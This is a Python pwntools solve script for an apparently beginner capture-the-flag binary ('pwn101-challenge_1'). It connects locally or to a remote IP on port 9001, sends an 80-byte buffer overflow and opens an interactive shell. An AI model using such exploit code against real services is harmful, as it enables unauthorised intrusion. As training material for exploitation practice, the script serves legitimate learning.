#!/usr/bin/env python3

from pwn import *
from exceptions import ArgumentValidationError
from dataclasses import dataclass

import argparse
import ipaddress


@dataclass
class SolveArgs:
    is_remote: bool
    ip: str


def parse_command_line(program_description: str) -> SolveArgs | None:

    parser = argparse.ArgumentParser(
        description=program_description,
        prog="solve.py",
        usage="./%(prog)s [-r --REMOTE] [-i --IP] [-h -- HELP]",
    )

    parser.add_argument(
        "-r",
        "--REMOTE",
        help="Connect to remote server",
        action="store_true",
    )

    parser.add_argument("-i", "--IP", help="IP address of the remote server", nargs="?")

    args, _ = parser.parse_known_args()

    if args.REMOTE is True and args.IP is None:
        raise ArgumentValidationError("Invalid number of arguments. Must be 0 or 2.")

    if args.REMOTE is True:
        try:
            _ = ipaddress.IPv4Address(args.IP)
        except ipaddress.AddressValueError as ip_address_error:
            raise ArgumentValidationError(
                f"Invalid IP address: {args.IP}"
            ) from ip_address_error

        solve_args = SolveArgs(is_remote=args.REMOTE, ip=args.IP)

    else:
        solve_args = None

    return solve_args


def main():

    # Start the program
    args = parse_command_line("Solve Script")

    if args is not None:
        binary = remote(args.ip, 9001)
    else:
        binary = process("./pwn101-challenge_1")

    # Receive the introduction
    intro = binary.recvuntil(b"briyani: \n").decode("utf-8")
    print(intro)

    # Send the buffer overflow and receive the response
    binary.sendline(b"A" * 80)
    response = binary.recvline().decode("utf-8")
    print(response)

    # Interact with the shell
    binary.interactive()


if __name__ == "__main__":
    main()
